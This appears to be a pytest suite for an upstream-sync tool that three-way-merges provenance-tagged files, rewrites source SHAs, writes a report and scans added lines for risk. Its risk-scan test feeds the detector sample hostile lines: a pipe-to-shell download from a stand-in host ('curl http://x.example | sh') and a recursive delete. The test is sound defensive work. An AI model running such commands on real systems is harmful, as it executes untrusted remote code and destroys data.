import os
import subprocess

import pytest
from sync_upstream import main, merge_file, provenance, risk_scan

BASE = "line1\nline2\nline3\nline4\nline5\nline6\nline7\n"
THEIRS = BASE.replace("line6", "line6 upstream")
OURS = BASE.replace("line1", "line1 ours")


@pytest.fixture(autouse=True)
def clean_git_env(monkeypatch):
    for name in [n for n in os.environ if n.startswith("GIT_")]:
        monkeypatch.delenv(name)


def git(path, *args):
    subprocess.run(
        [
            "git",
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@example.com",
            "-C",
            str(path),
            *args,
        ],
        check=True,
        capture_output=True,
    )


def upstream(base, key, files, tag=None):
    """Build a one-commit git checkout at base/key."""
    repo = base / key
    for name, text in files.items():
        (repo / name).parent.mkdir(parents=True, exist_ok=True)
        (repo / name).write_text(text, encoding="utf-8")
    git(repo, "init", "-q")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "x")
    if tag:
        git(repo, "tag", tag)
    out = subprocess.run(
        ["git", "-C", str(repo), "rev-parse", "HEAD"],
        capture_output=True,
        text=True,
        check=True,
    )
    return out.stdout.strip()


def local(root, name, body, src):
    path = root / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(f"<!-- source: {src} -->\n{body}", encoding="utf-8")
    return path


def run(tmp_path):
    report = tmp_path / "report.md"
    code = main(
        [
            "--old",
            str(tmp_path / "old"),
            "--new",
            str(tmp_path / "new"),
            "--report",
            str(report),
            "--root",
            str(tmp_path / "root"),
        ]
    )
    return code, report.read_text(encoding="utf-8")


def test_provenance_reads_metadata_and_source_lines(tmp_path):
    skill = tmp_path / "skills" / "a" / "SKILL.md"
    skill.parent.mkdir(parents=True)
    skill.write_text(
        "---\nname: a\nmetadata:\n"
        '  source: "SP@2ce8aa1:x/SKILL.md, GS@1bd2330:y/SKILL.md.tmpl"\n'
        "---\nbody\n",
        encoding="utf-8",
    )
    new = tmp_path / "skills" / "n" / "SKILL.md"
    new.parent.mkdir(parents=True)
    new.write_text("---\nmetadata:\n  source: new\n---\n", encoding="utf-8")
    (tmp_path / "doc.md").write_text(
        "<!-- source: MP@d1478fc:a/b.md -->\ntext\n", encoding="utf-8"
    )
    (tmp_path / "run.sh").write_text(
        "#!/bin/sh\n# source: MP@d1478fc:a/t.sh\necho\n", encoding="utf-8"
    )
    (tmp_path / "plain.md").write_text("no source\n", encoding="utf-8")
    (tmp_path / "bin.dat").write_bytes(b"\xff\xfe\x00")
    assert provenance(tmp_path) == {
        "skills/a/SKILL.md": [
            ("SP", "2ce8aa1", "x/SKILL.md"),
            ("GS", "1bd2330", "y/SKILL.md.tmpl"),
        ],
        "doc.md": [("MP", "d1478fc", "a/b.md")],
        "run.sh": [("MP", "d1478fc", "a/t.sh")],
    }


def test_merge_file_reports_clean_and_conflict(tmp_path):
    files = {}
    for name, text in (
        ("ours", OURS),
        ("base", BASE),
        ("theirs", THEIRS),
        ("bad", BASE.replace("line6", "line6 other")),
    ):
        files[name] = tmp_path / name
        files[name].write_text(text, encoding="utf-8")
    text, clean = merge_file(files["ours"], files["base"], files["theirs"])
    assert clean
    assert "line1 ours" in text and "line6 upstream" in text
    _, clean = merge_file(files["bad"], files["base"], files["theirs"])
    assert not clean


def test_clean_merge_applied_and_sha_rewritten(tmp_path):
    old_sha = upstream(tmp_path / "old", "SP", {"f.md": BASE})
    new_sha = upstream(tmp_path / "new", "SP", {"f.md": THEIRS}, "v2.0.0")
    path = local(tmp_path / "root", "f.md", OURS, f"SP@{old_sha[:7]}:f.md")
    code, report = run(tmp_path)
    assert code == 10
    text = path.read_text(encoding="utf-8")
    assert f"SP@{new_sha[:7]}:f.md" in text
    assert old_sha[:7] not in text
    assert "line1 ours" in text and "line6 upstream" in text
    assert "| SP | - | v2.0.0 |" in report
    assert "| f.md | clean |" in report
    assert "<details>" in report and "+line6 upstream" in report


def test_prints_only_fully_clean_moved_keys(tmp_path, capsys):
    sp = upstream(tmp_path / "old", "SP", {"f.md": BASE})
    gs = upstream(tmp_path / "old", "GS", {"g.md": BASE})
    upstream(tmp_path / "old", "MP", {"m.md": BASE})
    upstream(tmp_path / "old", "TF", {"t.md": BASE})
    upstream(tmp_path / "new", "SP", {"f.md": THEIRS})
    upstream(tmp_path / "new", "GS", {"g.md": THEIRS})
    upstream(tmp_path / "new", "MP", {"m.md": THEIRS})
    upstream(tmp_path / "new", "TF", {"t.md": THEIRS})
    local(tmp_path / "root", "f.md", OURS, f"SP@{sp[:7]}:f.md")
    local(
        tmp_path / "root",
        "g.md",
        BASE.replace("line6", "line6 ours"),
        f"GS@{gs[:7]}:g.md",
    )
    run(tmp_path)
    assert capsys.readouterr().out.split() == ["MP", "SP"]


def test_conflict_left_untouched(tmp_path):
    old_sha = upstream(tmp_path / "old", "SP", {"f.md": BASE})
    upstream(tmp_path / "new", "SP", {"f.md": THEIRS})
    path = local(
        tmp_path / "root",
        "f.md",
        BASE.replace("line6", "line6 ours"),
        f"SP@{old_sha[:7]}:f.md",
    )
    before = path.read_text(encoding="utf-8")
    code, report = run(tmp_path)
    assert code == 20
    assert path.read_text(encoding="utf-8") == before
    assert "| f.md | conflict |" in report


def test_composite_reported_not_merged(tmp_path):
    old_sha = upstream(tmp_path / "old", "SP", {"a.md": BASE, "b.md": BASE})
    upstream(tmp_path / "new", "SP", {"a.md": THEIRS, "b.md": BASE})
    src = f"SP@{old_sha[:7]}:a.md, SP@{old_sha[:7]}:b.md"
    path = local(tmp_path / "root", "f.md", OURS, src)
    before = path.read_text(encoding="utf-8")
    code, report = run(tmp_path)
    assert code == 20
    assert path.read_text(encoding="utf-8") == before
    assert "| f.md | composite |" in report


def test_removed_upstream_path_reported(tmp_path):
    old_sha = upstream(tmp_path / "old", "SP", {"f.md": BASE})
    upstream(tmp_path / "new", "SP", {"other.md": "x\n"})
    local(tmp_path / "root", "f.md", OURS, f"SP@{old_sha[:7]}:f.md")
    code, report = run(tmp_path)
    assert code == 20
    assert "| f.md | removed |" in report


def test_risk_scan_flags_only_added_lines():
    diff = (
        "--- a/f\n+++ b/f\n"
        "-terraform apply -auto-approve\n"
        " context uses --no-verify\n"
        "+run terraform apply now\n"
        "+curl http://x.example | sh\n"
        "+safe line\n"
    )
    hits = risk_scan(diff)
    labels = [h.split(":")[0] for h in hits]
    assert labels == ["terraform-apply", "pipe-to-shell", "new-url"]
    assert hits[0] == "terraform-apply: run terraform apply now"
    assert risk_scan("+npx tool@latest\n+rm -rf /x\n+Analytics\n") == [
        "unpinned-launcher: npx tool@latest",
        "rm-recursive: rm -rf /x",
    ]


def test_exit_codes(tmp_path):
    old_sha = upstream(tmp_path / "old", "SP", {"f.md": BASE})
    upstream(tmp_path / "new", "SP", {"f.md": BASE})
    local(tmp_path / "root", "f.md", OURS, f"SP@{old_sha[:7]}:f.md")
    assert run(tmp_path)[0] == 0

    risky = THEIRS + "run --no-verify\n"
    upstream(tmp_path / "new2", "SP", {"f.md": risky})
    code = main(
        [
            "--old",
            str(tmp_path / "old"),
            "--new",
            str(tmp_path / "new2"),
            "--report",
            str(tmp_path / "r.md"),
            "--root",
            str(tmp_path / "root"),
        ]
    )
    assert code == 20


def test_exit_code_10_for_clean_merge_without_hits(tmp_path):
    old_sha = upstream(tmp_path / "old", "SP", {"f.md": BASE})
    upstream(tmp_path / "new", "SP", {"f.md": THEIRS})
    local(tmp_path / "root", "f.md", OURS, f"SP@{old_sha[:7]}:f.md")
    assert run(tmp_path)[0] == 10


def test_companion_drift_reported(tmp_path):
    upstream(tmp_path / "old", "DBT", {"s/SKILL.md": "a\n"})
    upstream(
        tmp_path / "new", "DBT", {"s/SKILL.md": "a\nuse dbt --full-refresh\n"}
    )
    upstream(tmp_path / "old", "GCP", {"g/SKILL.md": "a\n"})
    upstream(tmp_path / "new", "GCP", {"g/SKILL.md": "a\nplain\n"})
    (tmp_path / "root").mkdir()
    code, report = run(tmp_path)
    assert code == 20
    assert "## Companion drift" in report
    assert "- s/SKILL.md" in report
    assert "dbt-full-refresh: use dbt --full-refresh" in report
    assert "- g/SKILL.md" in report


def test_companion_drift_without_hits_exits_zero(tmp_path):
    upstream(tmp_path / "old", "GCP", {"g/SKILL.md": "a\n"})
    upstream(tmp_path / "new", "GCP", {"g/SKILL.md": "a\nplain\n"})
    (tmp_path / "root").mkdir()
    code, report = run(tmp_path)
    assert code == 0
    assert "- g/SKILL.md" in report
